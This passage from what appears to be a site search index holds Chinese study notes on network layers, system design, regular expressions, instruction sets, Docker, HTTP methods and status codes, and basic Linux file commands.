：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的主机提供数据传输服务。数据链路层把网络层传下来的分组封装成帧。\n物理层 ：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。\nOSI # 其中表示层和会话层用途如下：\n表示层 ：数据压缩、加密以及数据描述，这使得应用程序不必关心在各台主机中数据内部格式不同的问题。\n会话层 ：建立及管理会话。\n五层协议没有表示层和会话层，而是将这些功能留给应用程序开发者处理。\nTCP/IP # 它只有四层，相当于五层协议中数据链路层和物理层合并为网络接口层。\nTCP/IP 体系结构不严格遵循 OSI 分层概念，应用层可能会直接使用 IP 层或者网络接口层。\n数据在各层之间的传递过程 # 在向下的过程中，需要添加下层协议所需要的首部或者尾部，而在向上的过程中不断拆开首部和尾部。\n路由器只有下面三层协议，因为路由器位于网络核心中，不需要为进程或者应用程序提供服务，因此也就不需要传输层和应用层。\n"},{"id":4,"href":"/keeplearning/docs/system-design/overview/","title":"系统设计基础","section":"系统设计","content":" 系统设计基础 # 一、性能 # 性能指标 # 1. 响应时间 # 指某个请求从发出到接收到响应消耗的时间。\n在对响应时间进行测试时，通常采用重复请求的方式，然后计算平均响应时间。\n2. 吞吐量 # 指系统在单位时间内可以处理的请求数量，通常使用每秒的请求数来衡量。\n3. 并发用户数 # 指系统能同时处理的并发用户请求数量。\n在没有并发存在的系统中，请求被顺序执行，此时响应时间为吞吐量的倒数。例如系统支持的吞吐量为 100 req/s，那么平均响应时间应该为 0.01s。\n目前的大型系统都支持多线程来处理并发请求，多线程能够提高吞吐量以及缩短响应时间，主要有两个原因：\n多 CPU IO 等待时间 使用 IO 多路复用等方式，系统在等待一个 IO 操作完成的这段时间内不需要被阻塞，可以去处理其它请求。通过将这个等待时间利用起来，使得 CPU 利用率大大提高。\n并发用户数不是越高越好，因为如果并发用户数太高，系统来不及处理这么多的请求，会使得过多的请求需要等待，那么响应时间就会大大提高。\n性能优化 # 1. 集群 # 将多台服务器组成集群，使用负载均衡将请求转发到集群中，避免单一服务器的负载压力过大导致性能降低。\n2. 缓存 # 缓存能够提高性能的原因如下：\n缓存数据通常位于内存等介质中，这种介质对于读操作特别快； 缓存数据可以位于靠近用户的地理位置上； 可以将计算结果进行缓存，从而避免重复计算。 3. 异步 # 某些流程可以将操作转换为消息，将消息发送到消息队列之后立即返回，之后这个操作会被异步处理。\n二、伸缩性 # 指不断向集群中添加服务器来缓解不断上升的用户并发访问压力和不断增长的数据存储需求。\n伸缩性与性能 # 如果系统存在性能问题，那么单个用户的请求总是很慢的；\n如果系统存在伸缩性问题，那么单个用户的请求可能会很快，但是在并发数很高的情况下系统会很慢。\n实现伸缩性 # 应用服务器只要不具有状态，那么就可以很容易地通过负载均衡器向集群中添加新的服务器。\n关系型数据库的伸缩性通过 Sharding 来实现，将数据按一定的规则分布到不同的节点上，从而解决单台存储服务器的存储空间限制。\n对于非关系型数据库，它们天生就是为海量数据而诞生，对伸缩性的支持特别好。\n三、扩展性 # 指的是添加新功能时对现有系统的其它应用无影响，这就要求不同应用具备低耦合的特点。\n实现可扩展主要有两种方式：\n使用消息队列进行解耦，应用之间通过消息传递进行通信； 使用分布式服务将业务和可复用的服务分离开来，业务使用分布式服务框架调用可复用的服务。新增的产品可以通过调用可复用的服务来实现业务逻辑，对其它产品没有影响。 四、可用性 # 冗余 # 保证高可用的主要手段是使用冗余，当某个服务器故障时就请求其它服务器。\n应用服务器的冗余比较容易实现，只要保证应用服务器不具有状态，那么某个应用服务器故障时，负载均衡器将该应用服务器原先的用户请求转发到另一个应用服务器上，不会对用户有任何影响。\n存储服务器的冗余需要使用主从复制来实现，当主服务器故障时，需要提升从服务器为主服务器，这个过程称为切换。\n监控 # 对 CPU、内存、磁盘、网络等系统负载信息进行监控，当某个信息达到一定阈值时通知运维人员，从而在系统发生故障之前及时发现问题。\n服务降级 # 服务降级是系统为了应对大量的请求，主动关闭部分功能，从而保证核心功能可用。\n五、安全性 # 要求系统在应对各种攻击手段时能够有可靠的应对措施。\n参考资料 # 大型网站技术架构：核心原理与案例分析 "},{"id":5,"href":"/keeplearning/docs/coding-practice/regex/","title":"正则表达式","section":"编码实践","content":" 正则表达式 # 一、概述 # 正则表达式用于文本内容的查找和替换。\n正则表达式内置于其它语言或者软件产品中，它本身不是一种语言或者软件。\n正则表达式在线工具\n二、匹配单个字符 # . 可以用来匹配任何的单个字符，但是在绝大多数实现里面，不能匹配换行符；\n. 是元字符，表示它有特殊的含义，而不是字符本身的含义。如果需要匹配 . ，那么要用 \\ 进行转义，即在 . 前面加上 \\ 。\n正则表达式一般是区分大小写的，但也有些实现不区分。\n正则表达式\nC.C2018 匹配结果\nMy name is CyC2018 .\n三、匹配一组字符 # [ ] 定义一个字符集合；\n0-9、a-z 定义了一个字符区间，区间使用 ASCII 码来确定，字符区间在 [ ] 中使用。\n- 只有在 [ ] 之间才是元字符，在 [ ] 之外就是一个普通字符；\n^ 在 [ ] 中是取非操作。\n应用\n匹配以 abc 为开头，并且最后一个字母不为数字的字符串：\n正则表达式\nabc[^0-9] 匹配结果\nabcd abc1 abc2 四、使用元字符 # 匹配空白字符 # 元字符 说明 [\\b] 回退（删除）一个字符 \\f 换页符 \\n 换行符 \\r 回车符 \\t 制表符 \\v 垂直制表符 \\r\\n 是 Windows 中的文本行结束标签，在 Unix/Linux 则是 \\n。\n\\r\\n\\r\\n 可以匹配 Windows 下的空白行，因为它匹配两个连续的行尾标签，而这正是两条记录之间的空白行；\n匹配特定的字符 # 1. 数字元字符 # 元字符 说明 \\d 数字字符，等价于 [0-9] \\D 非数字字符，等价于 [^0-9] 2. 字母数字元字符 # 元字符 说明 \\w 大小写字母，下划线和数字，等价于 [a-zA-Z0-9_] \\W 对 \\w 取非 3. 空白字符元字符 # 元字符 说明 \\s 任何一个空白字符，等价于 [\\f\\n\\r\\t\\v] \\S 对 \\s 取非 \\x 匹配十六进制字符，\\0 匹配八进制，例如 \\xA 对应值为 10 的 ASCII 字符 ，即 \\n。\n五、重复匹配 # + 匹配 1 个或者多个字符 ** * 匹配 0 个或者多个字符 ? 匹配 0 个或者 1 个字符 应用\n匹配邮箱地址。\n正则表达式\n[\\w.]+@\\w+\\.\\w+ [\\w.] 匹配的是字母数字或者 . ，在其后面加上 + ，表示匹配多次。在字符集合 [ ] 里，. 不是元字符；\n匹配结果\nabc.def\u0026lt;span\u0026gt;@\u0026lt;/span\u0026gt;qq.com\n{n} 匹配 n 个字符 {m,n} 匹配 m~n 个字符 {m,} 至少匹配 m 个字符 * 和 + 都是贪婪型元字符，会匹配尽可能多的内容。在后面加 ? 可以转换为懒惰型元字符，例如 *?、+? 和 {m,n}? 。\n正则表达式\na.+c 匹配结果\nabcabcabc\n由于 + 是贪婪型的，因此 .+ 会匹配更可能多的内容，所以会把整个 abcabcabc 文本都匹配，而不是只匹配前面的 abc 文本。用懒惰型可以实现匹配前面的。\n六、位置匹配 # 单词边界 # \\b 可以匹配一个单词的边界，边界是指位于 \\w 和 \\W 之间的位置；\\B 匹配一个不是单词边界的位置。\n\\b 只匹配位置，不匹配字符，因此 \\babc\\b 匹配出来的结果为 3 个字符。\n字符串边界 # ^ 匹配整个字符串的开头，$ 匹配结尾。\n^ 元字符在字符集合中用作求非，在字符集合外用作匹配字符串的开头。\n分行匹配模式（multiline）下，换行被当做字符串的边界。\n应用\n匹配代码中以 // 开始的注释行\n正则表达式\n^\\s*\\/\\/.*$ 匹配结果\npublic void fun() { // 注释 1 int a = 1; int b = 2; // 注释 2 int c = a + b; } 七、使用子表达式 # 使用 ( ) 定义一个子表达式。子表达式的内容可以当成一个独立元素，即可以将它看成一个字符，并且使用 * 等元字符。\n子表达式可以嵌套，但是嵌套层次过深会变得很难理解。\n正则表达式\n(ab){2,} 匹配结果\nababab\n| 是或元字符，它把左边和右边所有的部分都看成单独的两个部分，两个部分只要有一个匹配就行。\n正则表达式\n(19|20)\\d{2} 匹配结果\n1900 2010 1020 应用\n匹配 IP 地址。\nIP 地址中每部分都是 0-255 的数字，用正则表达式匹配时以下情况是合法的：\n一位数字 不以 0 开头的两位数字 1 开头的三位数 2 开头，第 2 位是 0-4 的三位数 25 开头，第 3 位是 0-5 的三位数 正则表达式\n((25[0-5]|(2[0-4]\\d)|(1\\d{2})|([1-9]\\d)|(\\d))\\.){3}(25[0-5]|(2[0-4]\\d)|(1\\d{2})|([1-9]\\d)|(\\d)) 匹配结果\n192.168.0.1 00.00.00.00 555.555.555.555 八、回溯引用 # 回溯引用使用 **\\n ** 来引用某个子表达式，其中 n 代表的是子表达式的序号，从 1 开始。它和子表达式匹配的内容一致，比如子表达式匹配到 abc，那么回溯引用部分也需要匹配 abc 。\n应用\n匹配 HTML 中合法的标题元素。\n正则表达式\n\\1 将回溯引用子表达式 (h[1-6]) 匹配的内容，也就是说必须和子表达式匹配的内容一致。\n\u0026lt;(h[1-6])\u0026gt;\\w*?\u0026lt;\\/\\1\u0026gt; 匹配结果\n\u0026lt;h1\u0026gt;x\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;x\u0026lt;/h2\u0026gt; \u0026lt;h3\u0026gt;x\u0026lt;/h1\u0026gt; 替换 # 需要用到两个正则表达式。\n应用\n修改电话号码格式。\n文本\n313-555-1234\n查找正则表达式\n(\\d{3})(-)(\\d{3})(-)(\\d{4}) 替换正则表达式\n在第一个子表达式查找的结果加上 () ，然后加一个空格，在第三个和第五个字表达式查找的结果中间加上 - 进行分隔。\n($1) $3-$5 结果\n(313) 555-1234\n大小写转换 # 元字符 说明 \\l 把下个字符转换为小写 \\u 把下个字符转换为大写 \\L 把\\L 和\\E 之间的字符全部转换为小写 \\U 把\\U 和\\E 之间的字符全部转换为大写 \\E 结束\\L 或者\\U 应用\n把文本的第二个和第三个字符转换为大写。\n文本\nabcd\n查找\n(\\w)(\\w{2})(\\w) 替换\n$1\\U$2\\E$3 结果\naBCd\n九、前后查找 # 前后查找规定了匹配的内容首尾应该匹配的内容，但是又不包含首尾匹配的内容。\n向前查找使用 **?= ** 定义，它规定了尾部匹配的内容，这个匹配的内容在 ?= 之后定义。所谓向前查找，就是规定了一个匹配的内容，然后以这个内容为尾部向前面查找需要匹配的内容。向后匹配用 ?\u0026lt;= 定义（注: JavaScript 不支持向后匹配，Java 对其支持也不完善）。\n应用\n查找出邮件地址 @ 字符前面的部分。\n正则表达式\n\\w+(?=@) 结果\nabc @qq.com\n对向前和向后查找取非，只要把 = 替换成 ! 即可，比如 (?=) 替换成 (?!) 。取非操作使得匹配那些首尾不符合要求的内容。\n十、嵌入条件 # 回溯引用条件 # 条件为某个子表达式是否匹配，如果匹配则需要继续匹配条件表达式后面的内容。\n正则表达式\n子表达式 (\\() 匹配一个左括号，其后的 ? 表示匹配 0 个或者 1 个。 ?(1) 为条件，当子表达式 1 匹配时条件成立，需要执行 ) 匹配，也就是匹配右括号。\n(\\()?abc(?(1)\\)) 结果\n(abc) abc (abc 前后查找条件 # 条件为定义的首尾是否匹配，如果匹配，则继续执行后面的匹配。注意，首尾不包含在匹配的内容中。\n正则表达式\n?(?=-) 为前向查找条件，只有在以 - 为前向查找的结尾能匹配 \\d{5} ，才继续匹配 -\\d{4} 。\n\\d{5}(?(?=-)-\\d{4}) 结果\n11111 22222- 33333-4444 "},{"id":6,"href":"/keeplearning/docs/os/instruction-set_arch/","title":"指令集","section":"操作系统","content":" 指令集 # 指令集架构 # 指令集架构是指一套软硬件的标准规范，CPU芯片和软件应用会围绕这套规范设计。从CPU发明到现在，有非常多种架构，从常见的x86、ARM，到不太常见的RISC-V，MIPS、IA64，它们之间的差距都非常大。\n有些时候我们会遇到在本地开发环境编译和运行正常的代码，在生产环境却无法正常工作，当然这个问题背后会有多种原因，而不同机器使用的不同指令集可能是原因之一。\n指令集架构是计算机的抽象模型，在很多时候也被称作架构或者计算机架构，它是计算机软件和硬件之间的接口和桥梁。一个为特定指令集架构编写的应用程序能够运行在所有支持这种指令集架构的机器上，也就是说如果当前应用程序支持 x86 的指令集，那么就可以运行在所有使用 x86 指令集的机器上，这其实就是抽象层的作用，每一个指令集架构都定义了支持的数据结构、寄存器、管理主内存的硬件支持（例如内存一致、地址模型和虚拟内存）、支持的指令集和 IO 模型，它的引入其实就在软件和硬件之间引入了一个抽象层，让同一个二进制文件能够在不同版本的硬件上运行。如果一个编程语言想要在所有的机器上运行，它就可以将中间代码转换成使用不同指令集架构的机器码，这可比为不同硬件单独移植要简单的太多了。\n复杂指令集（CISC）和精简指令集（RISC） # 最常见的指令集架构分类方法是根据指令的复杂度将其分为复杂指令集（CISC）和精简指令集（RISC），复杂指令集架构包含了很多特定的指令，但是其中的一些指令很少会被程序使用，而精简指令集只实现了经常被使用的指令，不常用的操作都会通过组合简单指令来实现。\n复杂指令集的特点就是指令数目多并且复杂，每条指令的字节长度并不相等，x86 就是常见的复杂指令集处理器，它的指令长度大小范围非常广，从 1 到 15 字节不等，对于长度不固定的指令，计算机必须额外对指令进行判断，这需要付出额外的性能损失。\n而精简指令集对指令的数目和寻址方式做了精简，大大减少指令数量的同时更容易实现，指令集中的每一个指令都使用标准的字节长度、执行时间相比复杂指令集会少很多，处理器在处理指令时也可以流水执行，提高了对并行的支持。作为一种常见的精简指令集处理器，arm 使用 4 个字节作为指令的固定长度，省略了判断指令的性能损失3，精简指令集其实就是利用了我们耳熟能详的 20/80 原则，用 20% 的基础指令和它们的组合来解决问题。\n复杂指令集和精简指令集的使用是设计上的权衡，经过这么多年的发展，两种指令集也相互借鉴和学习，与最开始刚被设计出来时已经有了较大的差别。最开始的计算机使用复杂指令集是因为当时计算机的性能和内存比较有限，业界需要尽可能地减少机器需要执行的指令，所以更倾向于高度编码、长度不等以及多操作数的指令。不过随着计算机性能的提升，出现了精简指令集这种牺牲代码密度换取简单实现的设计；除此之外，硬件的飞速提升还带来了更多的寄存器和更高的时钟频率，软件开发人员也不再直接接触汇编代码，而是通过编译器和汇编器生成指令，复杂的机器指令对于编译器来说很难利用，所以精简指令在这种场景下更适合。\n参考 # 机器码生成 "},{"id":7,"href":"/keeplearning/docs/coding-practice/docker/","title":"Docker","section":"编码实践","content":" Docker # 一、解决的问题 # 由于不同的机器有不同的操作系统，以及不同的库和组件，在将一个应用部署到多台机器上需要进行大量的环境配置操作。\nDocker 主要解决环境配置问题，它是一种虚拟化技术，对进程进行隔离，被隔离的进程独立于宿主操作系统和其它隔离的进程。使用 Docker 可以不修改应用程序代码，不需要开发人员学习特定环境下的技术，就能够将现有的应用程序部署在其它机器上。\n二、与虚拟机的比较 # 虚拟机也是一种虚拟化技术，它与 Docker 最大的区别在于它是通过模拟硬件，并在硬件上安装操作系统来实现。\n启动速度 # 启动虚拟机需要先启动虚拟机的操作系统，再启动应用，这个过程非常慢；\n而启动 Docker 相当于启动宿主操作系统上的一个进程。\n占用资源 # 虚拟机是一个完整的操作系统，需要占用大量的磁盘、内存和 CPU 资源，一台机器只能开启几十个的虚拟机。\n而 Docker 只是一个进程，只需要将应用以及相关的组件打包，在运行时占用很少的资源，一台机器可以开启成千上万个 Docker。\n三、优势 # 除了启动速度快以及占用资源少之外，Docker 具有以下优势：\n更容易迁移 # 提供一致性的运行环境。已经打包好的应用可以在不同的机器上进行迁移，而不用担心环境变化导致无法运行。\n更容易维护 # 使用分层技术和镜像，使得应用可以更容易复用重复的部分。复用程度越高，维护工作也越容易。\n更容易扩展 # 可以使用基础镜像进一步扩展得到新的镜像，并且官方和开源社区提供了大量的镜像，通过扩展这些镜像可以非常容易得到我们想要的镜像。\n四、使用场景 # 持续集成 # 持续集成指的是频繁地将代码集成到主干上，这样能够更快地发现错误。\nDocker 具有轻量级以及隔离性的特点，在将代码集成到一个 Docker 中不会对其它 Docker 产生影响。\n提供可伸缩的云服务 # 根据应用的负载情况，可以很容易地增加或者减少 Docker。\n搭建微服务架构 # Docker 轻量级的特点使得它很适合用于部署、维护、组合微服务。\n五、镜像与容器 # 镜像是一种静态的结构，可以看成面向对象里面的类，而容器是镜像的一个实例。\n镜像包含着容器运行时所需要的代码以及其它组件，它是一种分层结构，每一层都是只读的（read-only layers）。构建镜像时，会一层一层构建，前一层是后一层的基础。镜像的这种分层存储结构很适合镜像的复用以及定制。\n构建容器时，通过在镜像的基础上添加一个可写层（writable layer），用来保存着容器运行过程中的修改。\n参考资料 # DOCKER 101: INTRODUCTION TO DOCKER WEBINAR RECAP Docker 入门教程 Docker container vs Virtual machine How to Create Docker Container using Dockerfile 理解 Docker（2）：Docker 镜像 为什么要使用 Docker？ What is Docker 持续集成是什么？ "},{"id":8,"href":"/keeplearning/docs/http/http1/","title":"HTTP（一）","section":"HTTP","content":" HTTP（一） # 基础概念 # 请求和响应报文 # 客户端发送一个请求报文给服务器，服务器根据请求报文中的信息进行处理，并将处理结果放入响应报文中返回给客户端。\n请求报文结构：\n第一行是包含了请求方法、URL、协议版本； 接下来的多行都是请求首部 Header，每个首部都有一个首部名称，以及对应的值。 一个空行用来分隔首部和内容主体 Body 最后是请求的内容主体 GET http://www.example.com/ HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cache-Control: max-age=0 Host: www.example.com If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT If-None-Match: \u0026#34;3147526947+gzip\u0026#34; Proxy-Connection: keep-alive Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 xxx param1=1\u0026amp;param2=2 响应报文结构：\n第一行包含协议版本、状态码以及描述，最常见的是 200 OK 表示请求成功了 接下来多行也是首部内容 一个空行分隔首部和内容主体 最后是响应的内容主体 HTTP/1.1 200 OK Age: 529651 Cache-Control: max-age=604800 Connection: keep-alive Content-Encoding: gzip Content-Length: 648 Content-Type: text/html; charset=UTF-8 Date: Mon, 02 Nov 2020 17:53:39 GMT Etag: \u0026#34;3147526947+ident+gzip\u0026#34; Expires: Mon, 09 Nov 2020 17:53:39 GMT Keep-Alive: timeout=4 Last-Modified: Thu, 17 Oct 2019 07:18:26 GMT Proxy-Connection: keep-alive Server: ECS (sjc/16DF) Vary: Accept-Encoding X-Cache: HIT \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Example Domain\u0026lt;/title\u0026gt; // 省略... \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; URL # HTTP 使用 URL（ U niform Resource Locator，统一资源定位符）来定位资源，它是 URI（Uniform Resource Identifier，统一资源标识符）的子集，URL 在 URI 的基础上增加了定位能力。URI 除了包含 URL，还包含 URN（Uniform Resource Name，统一资源名称），它只是用来定义一个资源的名称，并不具备定位该资源的能力。例如 urn:isbn:0451450523 用来定义一个书籍名称，但是却没有表示怎么找到这本书。\nHTTP 方法 # 客户端发送的 请求报文 第一行为请求行，包含了方法字段。\nGET # 获取资源\n当前网络请求中，绝大部分使用的是 GET 方法。\nHEAD # 获取报文首部\n和 GET 方法类似，但是不返回报文实体主体部分。\n主要用于确认 URL 的有效性以及资源更新的日期时间等。\nPOST # 传输实体主体\nPOST 主要用来传输数据，而 GET 主要用来获取资源。\n更多 POST 与 GET 的比较请见第九章。\nPUT # 上传文件\n由于自身不带验证机制，任何人都可以上传文件，因此存在安全性问题，一般不使用该方法。\nPUT /new.html HTTP/1.1 Host: example.com Content-type: text/html Content-length: 16 \u0026lt;p\u0026gt;New File\u0026lt;/p\u0026gt; PATCH # 对资源进行部分修改\nPUT 也可以用于修改资源，但是只能完全替代原始资源，PATCH 允许部分修改。\nPATCH /file.txt HTTP/1.1 Host: www.example.com Content-Type: application/example If-Match: \u0026#34;e0023aa4e\u0026#34; Content-Length: 100 [description of changes] DELETE # 删除文件\n与 PUT 功能相反，并且同样不带验证机制。\nOPTIONS # 查询支持的方法\n查询指定的 URL 能够支持的方法。\n会返回Allow: GET, POST, HEAD, OPTIONS这样的内容。\nCONNECT # 要求在与代理服务器通信时建立隧道\n使用 SSL（Secure Sockets Layer，安全套接层）和 TLS（Transport Layer Security，传输层安全）协议把通信内容加密后经网络隧道传输。\nCONNECT www.example.com:443 HTTP/1.1 TRACE # 追踪路径\n服务器会将通信路径返回给客户端。\n发送请求时，在 Max-Forwards 首部字段中填入数值，每经过一个服务器就会减 1，当数值为 0 时就停止传输。\n通常不会使用 TRACE，并且它容易受到 XST 攻击（Cross-Site Tracing，跨站追踪）。\nGET 和 POST 比较 # 作用 # GET 用于获取资源，而 POST 用于传输实体主体。\n参数 # GET 和 POST 的请求都能使用额外的参数，但是 GET 的参数是以查询字符串出现在 URL 中，而 POST 的参数存储在实体主体中。不能因为 POST 参数存储在实体主体中就认为它的安全性更高，因为照样可以通过一些抓包工具（Fiddler）查看。\n因为 URL 只支持 ASCII 码，因此 GET 的参数中如果存在中文等字符就需要先进行编码。例如中文会转换为%E4%B8%AD%E6%96%87，而空格会转换为%20。POST 参数支持标准字符集。\nGET /test/demo_form.asp?name1=value1\u0026amp;name2=value2 HTTP/1.1 POST /test/demo_form.asp HTTP/1.1 Host: w3schools.com name1=value1\u0026amp;name2=value2 安全 # 安全的 HTTP 方法不会改变服务器状态，也就是说它只是可读的。\nGET 方法是安全的，而 POST 却不是，因为 POST 的目的是传送实体主体内容，这个内容可能是用户上传的表单数据，上传成功之后，服务器可能把这个数据存储到数据库中，因此状态也就发生了改变。\n安全的方法除了 GET 之外还有：HEAD、OPTIONS。\n不安全的方法除了 POST 之外还有 PUT、DELETE。\n幂等性 # 幂等的 HTTP 方法，同样的请求被执行一次与连续执行多次的效果是一样的，服务器的状态也是一样的。换句话说就是，幂等方法不应该具有副作用（统计用途除外）。\n所有的安全方法也都是幂等的。\n在正确实现的条件下，GET，HEAD，PUT 和 DELETE 等方法都是幂等的，而 POST 方法不是。\nGET /pageX HTTP/1.1 是幂等的，连续调用多次，客户端接收到的结果都是一样的：\nGET /pageX HTTP/1.1 GET /pageX HTTP/1.1 GET /pageX HTTP/1.1 GET /pageX HTTP/1.1 POST /add_row HTTP/1.1 不是幂等的，如果调用多次，就会增加多行记录：\nPOST /add_row HTTP/1.1 -\u0026gt; Adds a 1nd row POST /add_row HTTP/1.1 -\u0026gt; Adds a 2nd row POST /add_row HTTP/1.1 -\u0026gt; Adds a 3rd row DELETE /idX/delete HTTP/1.1 是幂等的，即使不同的请求接收到的状态码不一样：\nDELETE /idX/delete HTTP/1.1 -\u0026gt; Returns 200 if idX exists DELETE /idX/delete HTTP/1.1 -\u0026gt; Returns 404 as it just got deleted DELETE /idX/delete HTTP/1.1 -\u0026gt; Returns 404 可缓存 # 如果要对响应进行缓存，需要满足以下条件：\n请求报文的 HTTP 方法本身是可缓存的，包括 GET 和 HEAD，但是 PUT 和 DELETE 不可缓存，POST 在多数情况下不可缓存的。 响应报文的状态码是可缓存的，包括：200, 203, 204, 206, 300, 301, 404, 405, 410, 414, and 501。 响应报文的 Cache-Control 首部字段没有指定不进行缓存。 XMLHttpRequest # 为了阐述 POST 和 GET 的另一个区别，需要先了解 XMLHttpRequest：\nXMLHttpRequest 是一个 API，它为客户端提供了在客户端和服务器之间传输数据的功能。它提供了一个通过 URL 来获取数据的简单方式，并且不会使整个页面刷新。这使得网页只更新一部分页面而不会打扰到用户。XMLHttpRequest 在 AJAX 中被大量使用。\n在使用 XMLHttpRequest 的 POST 方法时，浏览器会先发送 Header 再发送 Data。但并不是所有浏览器会这么做，例如火狐就不会。 而 GET 方法 Header 和 Data 会一起发送。 HTTP 状态码 # 服务器返回的 响应报文 中第一行为状态行，包含了状态码以及原因短语，用来告知客户端请求的结果。\n状态码 类别 含义 1XX Informational（信息性状态码） 接收的请求正在处理 2XX Success（成功状态码） 请求正常处理完毕 3XX Redirection（重定向状态码） 需要进行附加操作以完成请求 4XX Client Error（客户端错误状态码） 服务器无法处理请求 5XX Server Error（服务器错误状态码） 服务器处理请求出错 1XX 信息 # 100 Continue ：表明到目前为止都很正常，客户端可以继续发送请求或者忽略这个响应。 ###2XX 成功\n200 OK\n204 No Content ：请求已经成功处理，但是返回的响应报文不包含实体的主体部分。一般在只需要从客户端往服务器发送信息，而不需要返回数据时使用。\n206 Partial Content ：表示客户端进行了范围请求，响应报文包含由 Content-Range 指定范围的实体内容。\n3XX 重定向 # 301 Moved Permanently ：永久性重定向\n302 Found ：临时性重定向\n303 See Other ：和 302 有着相同的功能，但是 303 明确要求客户端应该采用 GET 方法获取资源。\n注：虽然 HTTP 协议规定 301、302 状态下重定向时不允许把 POST 方法改成 GET 方法，但是大多数浏览器都会在 301、302 和 303 状态下的重定向把 POST 方法改成 GET 方法。\n304 Not Modified ：如果请求报文首部包含一些条件，例如：If-Match，If-Modified-Since，If-None-Match，If-Range，If-Unmodified-Since，如果不满足条件，则服务器会返回 304 状态码。\n307 Temporary Redirect ：临时重定向，与 302 的含义类似，但是 307 要求浏览器不会把重定向请求的 POST 方法改成 GET 方法。\n4XX 客户端错误 # 400 Bad Request ：请求报文中存在语法错误。\n401 Unauthorized ：该状态码表示发送的请求需要有认证信息（BASIC 认证、DIGEST 认证）。如果之前已进行过一次请求，则表示用户认证失败。\n403 Forbidden ：请求被拒绝。\n404 Not Found\n5XX 服务器错误 # 500 Internal Server Error ：服务器正在执行请求时发生错误。\n503 Service Unavailable ：服务器暂时处于超负载或正在进行停机维护，现在无法处理请求。\nHTTP 首部 # 有 4 种类型的首部字段：通用首部字段、请求首部字段、响应首部字段和实体首部字段。\n各种首部字段及其含义如下（不需要全记，仅供查阅）：\n通用首部字段 # 首部字段名 说明 Cache-Control 控制缓存的行为 Connection 控制不再转发给代理的首部字段、管理持久连接 Date 创建报文的日期时间 Pragma 报文指令 Trailer 报文末端的首部一览 Transfer-Encoding 指定报文主体的传输编码方式 Upgrade 升级为其他协议 Via 代理服务器的相关信息 Warning 错误通知 请求首部字段 # 首部字段名 说明 Accept 用户代理可处理的媒体类型 Accept-Charset 优先的字符集 Accept-Encoding 优先的内容编码 Accept-Language 优先的语言（自然语言） Authorization Web 认证信息 Expect 期待服务器的特定行为 From 用户的电子邮箱地址 Host 请求资源所在服务器 If-Match 比较实体标记（ETag） If-Modified-Since 比较资源的更新时间 If-None-Match 比较实体标记（与 If-Match 相反） If-Range 资源未更新时发送实体 Byte 的范围请求 If-Unmodified-Since 比较资源的更新时间（与 If-Modified-Since 相反） Max-Forwards 最大传输逐跳数 Proxy-Authorization 代理服务器要求客户端的认证信息 Range 实体的字节范围请求 Referer 对请求中 URI 的原始获取方 TE 传输编码的优先级 User-Agent HTTP 客户端程序的信息 响应首部字段 # 首部字段名 说明 Accept-Ranges 是否接受字节范围请求 Age 推算资源创建经过时间 ETag 资源的匹配信息 Location 令客户端重定向至指定 URI Proxy-Authenticate 代理服务器对客户端的认证信息 Retry-After 对再次发起请求的时机要求 Server HTTP 服务器的安装信息 Vary 代理服务器缓存的管理信息 WWW-Authenticate 服务器对客户端的认证信息 实体首部字段 # 首部字段名 说明 Allow 资源可支持的 HTTP 方法 Content-Encoding 实体主体适用的编码方式 Content-Language 实体主体的自然语言 Content-Length 实体主体的大小 Content-Location 替代对应资源的 URI Content-MD5 实体主体的报文摘要 Content-Range 实体主体的位置范围 Content-Type 实体主体的媒体类型 Expires 实体主体过期的日期时间 Last-Modified 资源的最后修改日期时间 "},{"id":9,"href":"/keeplearning/docs/linux/linux2/","title":"Linux（二）","section":"Linux","content":" Linux（二） # 文件 # 文件属性 # 用户分为三种：文件拥有者、群组以及其它人，对不同的用户有不同的文件权限。\n使用 ls 查看一个文件时，会显示一个文件的信息，例如\ndrwxr-xr-x 3 root root 17 May 6 00:14 .config 对这个信息的解释如下：\ndrwxr-xr-x：文件类型以及权限，第 1 位为文件类型字段，后 9 位为文件权限字段 3：链接数 root：文件拥有者 root：所属群组 17：文件大小 May 6 00:14：文件最后被修改的时间 .config：文件名 常见的文件类型及其含义有：\nd：目录 -：文件 l：链接文件 9 位的文件权限字段中，每 3 个为一组，共 3 组，每一组分别代表对文件拥有者、所属群组以及其它人的文件权限。一组权限中的 3 位分别为 r、w、x 权限，表示可读、可写、可执行。\n文件时间有以下三种：\nmodification time (mtime)：文件的内容更新就会更新； status time (ctime)：文件的状态（权限、属性）更新就会更新； access time (atime)：读取文件时就会更新。 文件与目录的基本操作 # 1. ls # 列出文件或者目录的信息，目录的信息就是其中包含的文件。\n## ls [-aAdfFhilnrRSt] file|dir -a ：列出全部的文件 -d ：仅列出目录本身 -l ：以长数据串行列出，包含文件的属性与权限等等数据 2. cd # 更换当前目录。\ncd [相对路径或绝对路径] 3. mkdir # 创建目录。\n## mkdir [-mp] 目录名称 -m ：配置目录权限 -p ：递归创建目录 4. rmdir # 删除目录，目录必须为空。\nrmdir [-p] 目录名称 -p ：递归删除目录 5. touch # 更新文件时间或者建立新文件。\n## touch [-acdmt] filename -a ： 更新 atime -c ： 更新 ctime，若该文件不存在则不建立新文件 -m ： 更新 mtime -d ： 后面可以接更新日期而不使用当前日期，也可以使用 --date=\u0026#34;日期或时间\u0026#34; -t ： 后面可以接更新时间而不使用当前时间，格式为[YYYYMMDDhhmm] 6. cp # 复制文件。如果源文件有两个以上，则目的文件一定要是目录才行。\ncp [-adfilprsu] source destination -a ：相当于 -dr --preserve=all -d ：若来源文件为链接文件，则复制链接文件属性而非文件本身 -i ：若目标文件已经存在时，在覆盖前会先询问 -p ：连同文件的属性一起复制过去 -r ：递归复制 -u ：destination 比 source 旧才更新 destination，或 destination 不存在的情况下才复制 --preserve=all ：除了 -p 的权限相关参数外，还加入 SELinux 的属性, 